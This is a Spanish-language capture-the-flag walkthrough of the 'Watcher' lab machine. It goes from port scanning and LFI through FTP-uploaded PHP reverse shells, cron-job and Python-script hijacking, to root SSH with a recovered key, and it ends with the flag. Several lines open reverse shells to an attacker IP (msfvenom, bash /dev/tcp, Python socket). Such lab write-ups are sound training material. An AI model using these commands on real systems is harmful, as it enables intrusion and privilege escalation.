 [Watcher]

 1. Reconocimiento

Escaneo de Puertos (Nmap)

`nmap -Pn -n -sV -sC -O -p21,22,80 10.67.155.146`

    Puerto 21: FTP (vsftpd 3.0.5)

    Puerto 22: SSH (OpenSSH 8.2p1)

    Puerto 80: HTTP (Apache 2.4.41 - Jekyll v4.1.1)

    Espacio para Imagen: [Inserte aquí captura de pantalla del escaneo Nmap]

Enumeración Web y Fuzzing

Al revisar el puerto 80, no se observaron anomalías a simple vista. Se procedió a realizar un fuzzing de directorios con gobuster:


`gobuster dir -u http://10.10.x.x/ -w directory-list-2.3-big.txt -x txt,php,html,js`

Resultados relevantes:

    /robots.txt
    /post.php
    /bunch.php 
    /round.php

 2. Explotación (LFI a RCE)
Descubrimiento de Parámetros (Ffuf)

Se utilizó ffuf para buscar parámetros vulnerables a LFI en post.php, encontrando el parámetro post:


`ffuf -u "http://10.67.155.146/post.php?FUZZ=../../../../etc/passwd" -w burp-parameter-names.txt -fs 2422`

 <img width="1007" height="336" alt="image" src="https://github.com/user-attachments/assets/44ec7bdd-9880-4d22-a4a2-281ff26b0248" />

 <img width="825" height="171" alt="image" src="https://github.com/user-attachments/assets/47c13947-8d21-427a-88aa-dd8783e8cdaa" />


Cadena de Explotación

    Se identificó un archivo sensible: secref_file_do_notread.

    Se localizó la ruta del servidor FTP: /home/ftpuser/ftp/files/.

    Se generó un payload en PHP con msfvenom y se subió al servidor:

    msfvenom -p php/reverse_php LHOST=192.168.167.92 LPORT=4444 -o shell.php

    Se activó la shell accediendo vía web: http://10.67.155.146/post.php?post=../../../../home/ftpuser/ftp/files/shell.php.


 3. Escalada de Privilegios
Paso 1: De www-data a toby

Se revisaron los privilegios de sudo:

`(toby) NOPASSWD: ALL`


Al tener permisos completos sobre el usuario toby, se procedió a pivotar.

Paso 2: De toby a mat (Abuso de Cron Job)

Se identificó una tarea programada (cron job) ejecutándose cada minuto por el usuario mat:

    Archivo: /home/toby/jobs/cow.sh
    Acción: Se modificó el script para incluir una reverse shell.

`echo "bash -c 'bash -i >& /dev/tcp/192.168.167.92/1235 0>&1'" > /home/toby/jobs/cow.sh`

Paso 3: De mat a will (Python Library Hijacking)

En el home de mat se encontró una nota indicando que mat puede ejecutar un script de Python como will mediante sudo.
Se procedió a inyectar código malicioso en el script cmd.py para obtener una shell como el usuario will:

# Inyección en /home/mat/scripts/cmd.py
def get_command(num):
    import os
    os.system("python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"192.168.167.92\",7777));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/bash\")' &")

Escalada Final a Root

Una vez como el usuario will, se revisaron sus grupos y archivos asociados:


`id # uid=1000(will) gid=1000(will) groups=1000(will),4(adm)`

Al pertenecer al grupo adm, se buscó información sensible y se encontró una clave privada codificada:

`find / -type f -group adm 2>/dev/null | grep key`
# Hallazgo: /opt/backups/key.b64

Descifrado y Acceso SSH

Se procedió a decodificar la clave RSA en la máquina atacante para obtener acceso directo como root:

# En la máquina atacante
`base64 -d key.b64 > id_rsa
chmod 600 id_rsa
ssh -i id_rsa root@10.67.155.146`

 5. Flags y Finalización

Como root, se obtuvo la flag final:


cat /root/flag_7.txt
# FLAG{who_watches_the_watchers}
    
